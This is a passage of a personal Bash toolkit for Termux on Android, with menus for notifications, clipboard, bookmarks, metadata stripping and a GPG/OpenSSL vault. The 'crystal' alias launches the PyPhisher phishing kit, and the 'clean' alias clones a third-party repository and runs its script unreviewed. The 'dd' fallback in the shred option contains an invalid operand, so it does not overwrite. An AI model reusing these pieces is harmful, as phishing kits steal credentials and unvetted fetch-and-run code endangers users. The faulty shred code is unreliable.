                cat -n "$cat_dir/entries.txt" | sed 's/^/  /' || printf "  ${FADE}Empty${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                printf "  ${C16}Quick Shortcuts — save frequently used text:${RESET}\n\n"
                printf "  ${WH}[1] URL  [2] Email  [3] Address  [4] Custom label${RESET}\n"
                echo ""; printf "  ${WH}Type: ${RESET}"; read -r qtype
                local label
                case "$qtype" in
                    1) label="URL" ;; 2) label="Email" ;; 3) label="Address" ;; 4) printf "  ${WH}Label: ${RESET}"; read -r label ;;
                    *) label="Clip" ;;
                esac
                echo ""; printf "  ${WH}Content: ${RESET}"; read -r content
                [[ -z "$content" ]] && continue
                mkdir -p "$CLIP_CATS/shortcuts"
                echo "[$label] $content" >> "$CLIP_CATS/shortcuts/entries.txt"
                printf "  ${GRN}✓ Shortcut saved under '%s'${RESET}\n" "$label"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                cat -n "$CLIP_HIST" | tail -20 | sed 's/^/  /'
                echo ""; printf "  ${WH}Entry number to delete: ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                sed -i "${num}d" "$CLIP_HIST" 2>/dev/null && printf "  ${GRN}✓ Deleted entry %s${RESET}\n" "$num" || printf "  ${RED}Failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                printf "  ${RED}Clear all clipboard history? [y/n]: ${RESET}"; read -r confirm
                [[ "$confirm" == "y" || "$confirm" == "Y" ]] && > "$CLIP_HIST" && printf "  ${GRN}✓ History cleared${RESET}\n" || printf "  ${FADE}Cancelled${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [17] NOTIFICATIONS HUB PORTAL
# ═══════════════════════════════════════════════════════════════════

notifications_portal() {
    while true; do
        clear
        _portal_entry "Notifications Hub" "${C17}"
        echo ""
        _dv17
        printf "  ${C17}${BOLD}NOTIFICATIONS HUB  —  Alerts · Portal Updates · System  ${RESET}\n"
        _dv17
        echo ""
        printf "  ${WH}termux-notification · system alerts · download alerts · portal pulse${RESET}\n"
        printf "  ${FADE}■ System alerts · portal updates · download complete · Bojack barks once${RESET}\n"
        echo ""
        _dv17
        echo ""
        printf "  ${WH}[1]  Send Notification — push custom Android notification           ${RESET}\n"
        printf "  ${WH}[2]  List Active — show all current Android notifications           ${RESET}\n"
        printf "  ${WH}[3]  Download Alert — notify when file appears in /sdcard/Download  ${RESET}\n"
        printf "  ${WH}[4]  System Info Alert — push battery + storage summary             ${RESET}\n"
        printf "  ${WH}[5]  Bojack Alert — send a Bojack-style notification                ${RESET}\n"
        printf "  ${WH}[6]  Portal Ready — send 'station ready' ping notification          ${RESET}\n"
        printf "  ${WH}[7]  Remove Notification — dismiss by ID                            ${RESET}\n"
        printf "  ${WH}[8]  Notification Log — view Fezzy Station notification history     ${RESET}\n"
        printf "  ${WH}[9]  Clear Notification Log                                         ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv17
        echo ""
        _hover_hint "notifs"
        echo ""
        printf "  ${C17}${BOLD}Choice » ${RESET}"
        read -r ch

        local NOTIF_LOG="$DLDIR/.notif_log.txt"
        touch "$NOTIF_LOG" 2>/dev/null

        _log_notif() {
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$NOTIF_LOG"
        }

        case "$ch" in
            1)
                echo ""; printf "  ${WH}Title: ${RESET}"; read -r title
                [[ -z "$title" ]] && continue
                echo ""; printf "  ${WH}Content: ${RESET}"; read -r content
                [[ -z "$content" ]] && continue
                echo ""; printf "  ${WH}Notification ID [default 1]: ${RESET}"; read -r nid
                [[ -z "$nid" ]] && nid=1
                termux-notification --id "$nid" --title "$title" --content "$content" 2>/dev/null && \
                    printf "  ${GRN}✓ Notification sent (ID: %s)${RESET}\n" "$nid" || \
                    printf "  ${RED}Failed — termux-api required${RESET}\n"
                _log_notif "SENT: [$title] $content"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""
                printf "  ${C17}[*] Active notifications...${RESET}\n\n"
                termux-notification-list 2>/dev/null | python3 -c "
import sys,json
try:
    notifs=json.load(sys.stdin)
    if not notifs:
        print('  No active notifications')
    for n in notifs:
        print(f\"  [{n.get('id','?')}] {n.get('packageName','?')}\")
        print(f\"      Title: {n.get('title','')}\")
        print(f\"      Body : {n.get('content','')}\")
        print()
except: print('  Failed or no notifications')
" 2>/dev/null || printf "  ${RED}termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${C17}[*] Watching %s for new files...${RESET}\n\n" "$WATCH_DIR"
                printf "  ${FADE}Ctrl+C to stop watching${RESET}\n\n"
                local before; before=$(ls "$WATCH_DIR" 2>/dev/null | sort | md5sum)
                local checking=true
                while $checking; do
                    sleep 3
                    local after; after=$(ls "$WATCH_DIR" 2>/dev/null | sort | md5sum)
                    if [[ "$before" != "$after" ]]; then
                        local newfile; newfile=$(ls -t "$WATCH_DIR" 2>/dev/null | head -1)
                        printf "  ${GRN}[!] New file detected: %s${RESET}\n" "$newfile"
                        termux-notification --id 42 --title "Fezzy Station" --content "Download complete: $newfile" 2>/dev/null
                        _log_notif "DOWNLOAD: $newfile"
                        before="$after"
                    fi
                    printf "  ${FADE}Watching...  [$(date '+%H:%M:%S')]${RESET}\r"
                done ;;
            4)
                echo ""
                local bat; bat=$(_get_battery 2>/dev/null || echo "N/A")
                local stor; stor=$(df -h ~/storage/downloads 2>/dev/null | tail -1 | awk '{print $4}' || echo "N/A")
                local msg="Battery: $bat  ·  Storage free: $stor"
                termux-notification --id 43 --title "Fezzy Station — System" --content "$msg" 2>/dev/null && \
                    printf "  ${GRN}✓ System alert sent${RESET}\n" || printf "  ${RED}Failed${RESET}\n"
                printf "  ${WH}%s${RESET}\n" "$msg"
                _log_notif "SYSTEM: $msg"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                local mood; mood=$(_bojack_mood)
                termux-notification --id 44 --title "Bojack Says:" --content "$mood" 2>/dev/null && \
                    printf "  ${GRN}✓ Bojack notification sent${RESET}\n" || printf "  ${RED}Failed${RESET}\n"
                printf "  ${HOT}%s${RESET}\n" "$mood"
                _log_notif "BOJACK: $mood"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                termux-notification --id 45 --title "Fezzy Portals V1 Enhanced" --content "30 portals active · Strategy Over Impulse · 999" 2>/dev/null && \
                    printf "  ${GRN}✓ Station ping sent${RESET}\n" || printf "  ${RED}Failed${RESET}\n"
                _log_notif "PING: Station ready"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""; printf "  ${WH}Notification ID to remove: ${RESET}"; read -r nid
                [[ -z "$nid" ]] && continue
                termux-notification-remove "$nid" 2>/dev/null && printf "  ${GRN}✓ Removed notification %s${RESET}\n" "$nid" || printf "  ${RED}Failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                printf "  ${C17}[*] Notification Log:${RESET}\n\n"
                if [[ ! -s "$NOTIF_LOG" ]]; then
                    printf "  ${FADE}No log entries yet${RESET}\n"
                else
                    tail -30 "$NOTIF_LOG" | sed 's/^/  /'
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                printf "  ${RED}Clear notification log? [y/n]: ${RESET}"; read -r confirm
                [[ "$confirm" == "y" || "$confirm" == "Y" ]] && > "$NOTIF_LOG" && printf "  ${GRN}✓ Log cleared${RESET}\n" || printf "  ${FADE}Cancelled${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# 
#  ALIASES
# 
alias dl='media_station_portal'
alias fezzy='media_station_portal'
alias station='media_station_portal'
alias sc='shortcuts_guide'

# ── portal shell functions ───────────────────────────────────────
gallery()    { gallery_portal; }
music()      { music_portal; }
video()      { video_portal; }
grab()       { webgrab_portal; }
search()     { search_portal; }
tools()      { tool_portal; }
jw()         { juicewrld_portal; }
social()     { social_portal; }
fileorg()    { fileorg_portal; }
books()      { books_portal; }
hacker()     { hacker_portal; }
pdf()        { pdf_portal; }
docs()       { documents_portal; }
android()    { android_bridge_portal; }
dlm()        { dlmanager_portal; }
clip()       { clipboard_portal; }
notifs()     { notifications_portal; }
research()   { research_portal; }
ghub()       { github_portal; }
news()       { news_portal; }
fhacker()    { fezzyhacker_portal; }
encrypt()    { encryption_portal; }
torrent()    { torrent_portal; }
desktop()    { termux_desktop_portal; }
filemgr()    { file_manager_portal; }
shortcuts()  { shortcut_builder_portal; }
foss()       { foss_portal; }
encyclopedia() { encyclopedia_portal; }
artist()     { fezzy_artist_portal; }
player()     { music_player_portal; }

# ── numbered portal aliases ──────────────────────────────────────
alias 1='gallery_portal'
alias 2='music_portal'
alias 3='video_portal'
alias 4='webgrab_portal'
alias 5='search_portal'
alias 6='tool_portal'
alias 7='juicewrld_portal'
alias 8='social_portal'
alias 9='fileorg_portal'
alias 10='books_portal'
alias 11='hacker_portal'
alias 12='pdf_portal'
alias 13='documents_portal'
alias 14='android_bridge_portal'
alias 15='dlmanager_portal'
alias 16='clipboard_portal'
alias 17='notifications_portal'
alias 18='research_portal'
alias 19='github_portal'
alias 20='news_portal'
alias 21='fezzyhacker_portal'
alias 22='encryption_portal'
alias 23='torrent_portal'
alias 24='termux_desktop_portal'
alias 25='file_manager_portal'
alias 26='shortcut_builder_portal'
alias 27='foss_portal'
alias 28='encyclopedia_portal'
alias 29='fezzy_artist_portal'
alias 30='music_player_portal'

# ── system shortcuts ─────────────────────────────────────────────
alias reload='source ~/.bashrc && echo "  ✓ Reloaded"'
alias detox='rm -rf "${TMPDIR:-/tmp}"/fezzy_* 2>/dev/null; apt autoremove -y 2>/dev/null; pkg clean 2>/dev/null; termux-setup-storage 2>/dev/null; echo "  ✓ Detox done"'
alias clean='if command -v git &>/dev/null; then git clone https://github.com/adi1090x/termux-junk-cleaner ~/termux-junk-cleaner 2>/dev/null || true; bash ~/termux-junk-cleaner/clean.sh; else echo "  ✗ git not found — pkg install git"; fi'
alias crystal='if [[ -f ~/pyphisher.py ]]; then python3 ~/pyphisher.py; else echo "  ✗ PyPhisher not found — dl → [21] → [15] to download"; fi'
alias pkgup='pkg update -y && pkg upgrade -y'
alias pkgi='pkg install'
alias pkgr='pkg remove'
alias pkgs='pkg search'
alias pkglist='pkg list-installed 2>/dev/null | less'
alias pipi='pip install --break-system-packages'
alias pipup='pip install --upgrade pip --break-system-packages'
alias myip='curl -s https://ipinfo.io/ip 2>/dev/null && echo ""'
alias space='du -sh ~/storage/downloads 2>/dev/null'
alias psall='ps aux 2>/dev/null | head -20'
alias install='_install_permanent'
alias k9='_k9_security_report'

printf "${GRN}✓ Fezzy Portals V1 Enhanced loaded — 30 portals ready${RESET}\n"
printf "${FADE}Type 'station' to launch  ·  Strategy Over Impulse  ·  999${RESET}\n"
printf "${FADE}Type dl to launch  ·  Strategy Over Impulse  ·  999${RESET}\n"


# ─── WRITE & SAVE DOCUMENT ─────────────────────────────────────────
# Write .txt or .md in any portal dir. nano to write, auto-saved.
_write_document() {
    local target_dir="$1"
    local label="${2:-Documents}"
    mkdir -p "$target_dir" 2>/dev/null
    echo ""
    printf "  ${C13}[WRITE]${RESET} ${WH}%s${RESET}\n\n" "$label"
    printf "  ${WH}File name (no extension): ${RESET}"; read -r fname
    [[ -z "$fname" ]] && return 1
    printf "  ${WH}Format [1] .txt  [2] .md  [3] .sh: ${RESET}"; read -r fmt
    local ext=".txt"
    [[ "$fmt" == "2" ]] && ext=".md"
    [[ "$fmt" == "3" ]] && ext=".sh"
    local fullpath="$target_dir/${fname}${ext}"
    echo ""
    printf "  ${C13}[*] Opening nano → Ctrl+O to save, Ctrl+X to exit${RESET}\n"
    printf "  ${FADE}Saving to: %s${RESET}\n\n" "$fullpath"
    sleep 1.2
    nano "$fullpath"
    if [[ -f "$fullpath" && -s "$fullpath" ]]; then
        printf "\n  ${GRN}✓ Saved: %s${RESET}\n" "$fullpath"
        local sz; sz=$(du -sh "$fullpath" 2>/dev/null | awk '{print $1}')
        printf "  ${FADE}Size: %s${RESET}\n" "$sz"
        echo ""
        printf "  ${WH}Copy to /sdcard/Download? [y/n]: ${RESET}"; read -r cpy
        [[ "$cpy" == "y" || "$cpy" == "Y" ]] && cp "$fullpath" "/sdcard/Download/" && printf "  ${GRN}✓ Copied to /sdcard/Download/%s${RESET}\n" "$(basename "$fullpath")"
    else
        printf "\n  ${RED}Not saved — empty file or cancelled${RESET}\n"
        [[ -f "$fullpath" ]] && rm -f "$fullpath"
    fi
    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
}

# ─── BOOKMARK MANAGER ──────────────────────────────────────────────
BOOKMARKS_FILE="$HOME/.fezzy_bookmarks"
touch "$BOOKMARKS_FILE" 2>/dev/null

_bookmark_manager() {
    while true; do
        clear; echo ""
        printf "  ${CY}${BOLD}BOOKMARK MANAGER  —  Save URLs · Tag · Search · Launch${RESET}\n"
        printf "  ${FADE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n\n"
        local count; count=$(grep -c "^" "$BOOKMARKS_FILE" 2>/dev/null || echo 0)
        printf "  ${FADE}%s bookmark(s) saved · %s${RESET}\n\n" "$count" "$BOOKMARKS_FILE"
        printf "  ${WH}[1] Add bookmark (URL + tags)\n"
        printf "  [2] List all bookmarks\n"
        printf "  [3] Search by tag or keyword\n"
        printf "  [4] Open bookmark in browser (termux-open-url)\n"
        printf "  [5] Delete bookmark\n"
        printf "  [6] Export bookmarks to .txt\n"
        printf "  [b] Back${RESET}\n\n"
        printf "  ${CY}Choice » ${RESET}"; read -r bch
        case "$bch" in
            1)
                printf "  ${WH}URL: ${RESET}"; read -r burl
                [[ -z "$burl" ]] && continue
                printf "  ${WH}Title/Note: ${RESET}"; read -r btitle
                printf "  ${WH}Tags (space-separated): ${RESET}"; read -r btags
                echo "$(date '+%Y-%m-%d') | $btags | $btitle | $burl" >> "$BOOKMARKS_FILE"
                printf "  ${GRN}✓ Bookmark saved${RESET}\n"; sleep 1 ;;
            2)
                echo ""
                if [[ ! -s "$BOOKMARKS_FILE" ]]; then printf "  ${FADE}No bookmarks yet${RESET}\n"
                else
                    local i=1
                    while IFS= read -r line; do
                        printf "  ${CY}%3d.${RESET} %s\n" "$i" "$line"; ((i++))
                    done < "$BOOKMARKS_FILE"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                printf "  ${WH}Search keyword/tag: ${RESET}"; read -r bq
                [[ -z "$bq" ]] && continue
                echo ""
                grep -i "$bq" "$BOOKMARKS_FILE" | nl -w3 -s". " | sed 's/^/  /'
                [[ ${PIPESTATUS[0]} -ne 0 ]] && printf "  ${FADE}No matches${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                local i=1
                while IFS= read -r line; do printf "  ${CY}%3d.${RESET} %s\n" "$i" "$line"; ((i++)); done < "$BOOKMARKS_FILE"
                printf "\n  ${WH}Number to open: ${RESET}"; read -r bnum
                local burl; burl=$(sed -n "${bnum}p" "$BOOKMARKS_FILE" | awk -F'|' '{print $NF}' | xargs)
                [[ -z "$burl" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                termux-open-url "$burl" 2>/dev/null || printf "  ${WH}URL: %s${RESET}\n" "$burl"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                local i=1
                while IFS= read -r line; do printf "  ${CY}%3d.${RESET} %s\n" "$i" "$line"; ((i++)); done < "$BOOKMARKS_FILE"
                printf "\n  ${WH}Number to delete: ${RESET}"; read -r bnum
                sed -i "${bnum}d" "$BOOKMARKS_FILE" && printf "  ${GRN}✓ Deleted${RESET}\n" || printf "  ${RED}Failed${RESET}\n"
                sleep 1 ;;
            6)
                local bexp="$DLDIR/bookmarks_export_$(date +%Y%m%d_%H%M%S).txt"
                cp "$BOOKMARKS_FILE" "$bexp" && printf "  ${GRN}✓ Exported: %s${RESET}\n" "$bexp" || printf "  ${RED}Failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
        esac
    done 2>/dev/null
}

# ─── METADATA STRIPPER BATCH ───────────────────────────────────────
_meta_strip_batch() {
    echo ""
    printf "  ${MAG}[META STRIP BATCH]${RESET} ${WH}Choose folder:${RESET}\n\n"
    printf "  ${WH}[1] ~/storage/downloads/gallery\n"
    printf "  [2] ~/storage/downloads/private\n"
    printf "  [3] ~/storage/downloads/music\n"
    printf "  [4] ~/storage/downloads (all)\n"
    printf "  [5] Custom path${RESET}\n\n"
    printf "  ${WH}Choice: ${RESET}"; read -r mch
    local mdir
    case "$mch" in
        1) mdir="$GALDIR" ;;
        2) mdir=~/storage/downloads/private ;;
        3) mdir=~/storage/downloads/music ;;
        4) mdir="$DLDIR" ;;
        5) printf "  ${WH}Path: ${RESET}"; read -r mdir; mdir=$(_xpath "$mdir") ;;
        *) printf "  ${RED}Invalid${RESET}\n"; return ;;
    esac
    [[ ! -d "$mdir" ]] && { printf "  ${RED}Directory not found${RESET}\n"; return; }
    echo ""
    local img_count=0 vid_count=0 aud_count=0
    printf "  ${MAG}[*] Stripping metadata from images...${RESET}\n"
    while IFS= read -r -d '' f; do
        if command -v exiftool &>/dev/null; then
            exiftool -all= -overwrite_original "$f" -q 2>/dev/null && ((img_count++))
        elif command -v convert &>/dev/null; then
            convert "$f" -strip "$f" 2>/dev/null && ((img_count++))
        fi
    done < <(find "$mdir" -maxdepth 3 \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" -o -name "*.gif" -o -name "*.webp" \) -type f -print0 2>/dev/null)

    printf "  ${MAG}[*] Stripping metadata from videos...${RESET}\n"
    while IFS= read -r -d '' f; do
        local out="${f%.*}_clean.${f##*.}"
        ffmpeg -i "$f" -map_metadata -1 -c copy "$out" -y -loglevel error 2>/dev/null && \
            mv "$out" "$f" && ((vid_count++))
    done < <(find "$mdir" -maxdepth 3 \( -name "*.mp4" -o -name "*.mkv" -o -name "*.webm" \) -type f -print0 2>/dev/null)

    printf "  ${MAG}[*] Stripping metadata from audio...${RESET}\n"
    while IFS= read -r -d '' f; do
        local out="${f%.*}_clean.${f##*.}"
        ffmpeg -i "$f" -map_metadata -1 -c copy "$out" -y -loglevel error 2>/dev/null && \
            mv "$out" "$f" && ((aud_count++))
    done < <(find "$mdir" -maxdepth 3 \( -name "*.mp3" -o -name "*.flac" -o -name "*.m4a" \) -type f -print0 2>/dev/null)

    echo ""
    printf "  ${GRN}✓ Images cleaned: %s${RESET}\n" "$img_count"
    printf "  ${GRN}✓ Videos cleaned: %s${RESET}\n" "$vid_count"
    printf "  ${GRN}✓ Audio cleaned:  %s${RESET}\n" "$aud_count"
    [[ $img_count -eq 0 && $vid_count -eq 0 && $aud_count -eq 0 ]] && \
        printf "  ${YEL}[!] No files processed. Install: pkg install exiftool ffmpeg${RESET}\n"
    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
}

# ─── CLIPBOARD TEMPLATES ───────────────────────────────────────────
CLIP_TEMPLATES_FILE="$HOME/.fezzy_clip_templates"
if [[ ! -f "$CLIP_TEMPLATES_FILE" ]]; then
cat > "$CLIP_TEMPLATES_FILE" << 'TMPL'
[email-sig]||Strategy Over Impulse | Grant Fezzy | philfesters@github | 999
[osint-google]||site: "" intext:"" filetype:pdf
[osint-username]||site:instagram.com OR site:twitter.com ""
[dl-command]||yt-dlp -x --audio-format mp3 --embed-thumbnail -o "%(title)s.%(ext)s" ""
[curl-fetch]||curl -sL -A "Mozilla/5.0" "" | less
[gpg-encrypt]||gpg --symmetric --cipher-algo AES256 --armor ""
[ssh-tunnel]||ssh -L 8080:localhost:80 user@host -N -f
[adb-connect]||adb connect 192.168.1.XXX:5555
[termux-wake]||termux-wake-lock && echo "Wake lock active"
[fezzy-999]||Strategy Over Impulse · 999 · Bojack never tells
TMPL
fi

_clipboard_templates() {
    while true; do
        clear; echo ""
        printf "  ${MAG}${BOLD}CLIPBOARD TEMPLATES  —  One-key paste snippets${RESET}\n"
        printf "  ${FADE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n\n"
        local i=1
        while IFS='||' read -r tag body; do
            [[ -z "$tag" ]] && continue
            printf "  ${MAG}%2d.${RESET} %-20s ${FADE}%s${RESET}\n" "$i" "$tag" "${body:0:45}..."
            ((i++))
        done < "$CLIP_TEMPLATES_FILE"
        echo ""
        printf "  ${WH}[a] Add template  [d] Delete  [b] Back${RESET}\n\n"
        printf "  ${MAG}Number to copy/use » ${RESET}"; read -r tch
        case "$tch" in
            a|A)
                printf "  ${WH}Tag (e.g. [my-tag]): ${RESET}"; read -r ttag
                printf "  ${WH}Template body: ${RESET}"; read -r tbody
                [[ -z "$ttag" || -z "$tbody" ]] && continue
                echo "${ttag}||${tbody}" >> "$CLIP_TEMPLATES_FILE"
                printf "  ${GRN}✓ Template saved${RESET}\n"; sleep 1 ;;
            d|D)
                printf "  ${WH}Number to delete: ${RESET}"; read -r tdel
                sed -i "${tdel}d" "$CLIP_TEMPLATES_FILE" && printf "  ${GRN}✓ Deleted${RESET}\n"
                sleep 1 ;;
            b|B) return 0 ;;
            ''|*[!0-9]*) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
            *)
                local body; body=$(sed -n "${tch}p" "$CLIP_TEMPLATES_FILE" | cut -d'|' -f3-)
                [[ -z "$body" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 0.7; continue; }
                printf "\n  ${GRN}Template:${RESET}\n  ${WH}%s${RESET}\n\n" "$body"
                if command -v termux-clipboard-set &>/dev/null; then
                    echo "$body" | termux-clipboard-set && printf "  ${GRN}✓ Copied to Android clipboard${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
        esac
    done 2>/dev/null
}

# ─── ENCRYPTION VAULT ──────────────────────────────────────────────
VAULT_DIR="$HOME/storage/downloads/private/.vault"
mkdir -p "$VAULT_DIR" 2>/dev/null

_encryption_vault() {
    while true; do
        clear; echo ""
        printf "  ${PU}${BOLD}ENCRYPTION VAULT  —  GPG · OpenSSL · Secure Delete${RESET}\n"
        printf "  ${FADE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n\n"
        local vcount; vcount=$(find "$VAULT_DIR" -maxdepth 1 -name "*.gpg" -o -name "*.enc" 2>/dev/null | wc -l)
        printf "  ${FADE}%s encrypted file(s) in vault · %s${RESET}\n\n" "$vcount" "$VAULT_DIR"
        printf "  ${WH}[1] Encrypt file (GPG symmetric)\n"
        printf "  [2] Decrypt file\n"
        printf "  [3] Encrypt with OpenSSL (AES-256)\n"
        printf "  [4] Decrypt OpenSSL file\n"
        printf "  [5] List vault contents\n"
        printf "  [6] Secure shred file (overwrite + delete)\n"
        printf "  [7] Install gpg\n"
        printf "  [8] Encrypt entire folder (GPG zip + encrypt)\n"
        printf "  [b] Back${RESET}\n\n"
        printf "  ${PU}Choice » ${RESET}"; read -r ech
        case "$ech" in
            1)
                printf "  ${WH}File to encrypt: ${RESET}"; read -r efile
                efile=$(_xpath "$efile")
                [[ ! -f "$efile" ]] && { printf "  ${RED}Not found${RESET}\n"; sleep 1; continue; }
                local out="$VAULT_DIR/$(basename "$efile").gpg"
                echo ""
                if command -v gpg &>/dev/null; then
                    gpg --symmetric --cipher-algo AES256 --output "$out" "$efile" && \
                        printf "  ${GRN}✓ Encrypted: %s${RESET}\n" "$out" && \
                        printf "  ${WH}Shred original? [y/n]: ${RESET}" && read -r shrd && \
                        [[ "$shrd" == "y" ]] && shred -uz "$efile" && printf "  ${GRN}✓ Original shredded${RESET}\n"
                else
                    printf "  ${RED}gpg not installed — option [7] to install${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                printf "  ${WH}GPG file to decrypt (.gpg): ${RESET}"; read -r efile
                efile=$(_xpath "$efile")
                [[ ! -f "$efile" ]] && { printf "  ${RED}Not found${RESET}\n"; sleep 1; continue; }
                local out="${efile%.gpg}"
                echo ""
                gpg --output "$out" --decrypt "$efile" 2>/dev/null && \
                    printf "  ${GRN}✓ Decrypted: %s${RESET}\n" "$out" || \
                    printf "  ${RED}Decryption failed — wrong passphrase?${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                printf "  ${WH}File to encrypt: ${RESET}"; read -r efile
                efile=$(_xpath "$efile")
                [[ ! -f "$efile" ]] && { printf "  ${RED}Not found${RESET}\n"; sleep 1; continue; }
                local out="$VAULT_DIR/$(basename "$efile").enc"
                echo ""
                printf "  ${WH}Passphrase: ${RESET}"; read -rs epass; echo ""
                openssl enc -aes-256-cbc -pbkdf2 -in "$efile" -out "$out" -pass pass:"$epass" 2>/dev/null && \
                    printf "  ${GRN}✓ Encrypted: %s${RESET}\n" "$out" || \
                    printf "  ${RED}openssl failed — pkg install openssl${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                printf "  ${WH}File to decrypt (.enc): ${RESET}"; read -r efile
                efile=$(_xpath "$efile")
                [[ ! -f "$efile" ]] && { printf "  ${RED}Not found${RESET}\n"; sleep 1; continue; }
                local out="${efile%.enc}"
                echo ""
                printf "  ${WH}Passphrase: ${RESET}"; read -rs epass; echo ""
                openssl enc -d -aes-256-cbc -pbkdf2 -in "$efile" -out "$out" -pass pass:"$epass" 2>/dev/null && \
                    printf "  ${GRN}✓ Decrypted: %s${RESET}\n" "$out" || \
                    printf "  ${RED}Decryption failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                find "$VAULT_DIR" -maxdepth 1 -type f 2>/dev/null | while IFS= read -r f; do
                    local sz; sz=$(du -sh "$f" 2>/dev/null | awk '{print $1}')
                    printf "  ${PU}●${RESET} %-40s ${FADE}%s${RESET}\n" "$(basename "$f")" "$sz"
                done || printf "  ${FADE}Vault empty${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                printf "  ${WH}File to shred: ${RESET}"; read -r efile
                efile=$(_xpath "$efile")
                [[ ! -f "$efile" ]] && { printf "  ${RED}Not found${RESET}\n"; sleep 1; continue; }
                printf "  ${RED}PERMANENTLY destroy %s? [yes]: ${RESET}" "$(basename "$efile")"; read -r conf
                if [[ "$conf" == "yes" ]]; then
                    if command -v shred &>/dev/null; then
                        shred -uz "$efile" && printf "  ${GRN}✓ Shredded${RESET}\n"
                    else
                        dd i=/dev/urandom of="$efile" bs=4096 count=10 conv=notrunc 2>/dev/null
                        rm -f "$efile" && printf "  ${GRN}✓ Overwritten and deleted${RESET}\n"
                    fi
                else
                    printf "  ${FADE}Cancelled${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                pkg install gnupg -y
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                printf "  ${WH}Folder to encrypt (full path or ~/...): ${RESET}"; read -r _efolder
                _efolder=$(_xpath "$_efolder")
                [[ ! -d "$_efolder" ]] && { printf "  ${RED}Folder not found${RESET}\n"; sleep 1; continue; }
                local _efname; _efname="$(basename "$_efolder")_$(date +%Y%m%d_%H%M%S)"
                local _ezip="${TMPDIR:-/tmp}/${_efname}.tar.gz"
                local _eout="$VAULT_DIR/${_efname}.tar.gz.gpg"
                echo ""
                printf "  ${PU}[1/3] Zipping folder...${RESET}\n"
                tar -czf "$_ezip" -C "$(dirname "$_efolder")" "$(basename "$_efolder")" 2>/dev/null \
                    || { printf "  ${RED}tar failed${RESET}\n"; sleep 1; continue; }
                printf "  ${PU}[2/3] Encrypting with GPG AES-256...${RESET}\n"
                if command -v gpg &>/dev/null; then
                    gpg --symmetric --cipher-algo AES256 --output "$_eout" "$_ezip" 2>/dev/null \
                        && printf "  ${GRN}✓ Encrypted: %s${RESET}\n" "$_eout" \
                        || { printf "  ${RED}GPG failed${RESET}\n"; rm -f "$_ezip"; sleep 1; continue; }
                else
                    printf "  ${WH}Passphrase: ${RESET}"; read -rs _epass; echo ""
                    openssl enc -aes-256-cbc -pbkdf2 -in "$_ezip" -out "${_eout%.gpg}.enc" \
                        -pass pass:"$_epass" 2>/dev/null \
                        && printf "  ${GRN}✓ Encrypted (OpenSSL): %s${RESET}\n" "${_eout%.gpg}.enc" \
                        || printf "  ${RED}Encryption failed — install gpg: pkg install gnupg${RESET}\n"
                fi
                rm -f "$_ezip"
                printf "  ${PU}[3/3] Temp zip removed${RESET}\n"
                echo ""
                printf "  ${WH}Shred original folder? [yes/no]: ${RESET}"; read -r _eshrd
                if [[ "$_eshrd" == "yes" ]]; then
                    find "$_efolder" -type f -exec shred -uz {} \; 2>/dev/null
                    rm -rf "$_efolder" 2>/dev/null
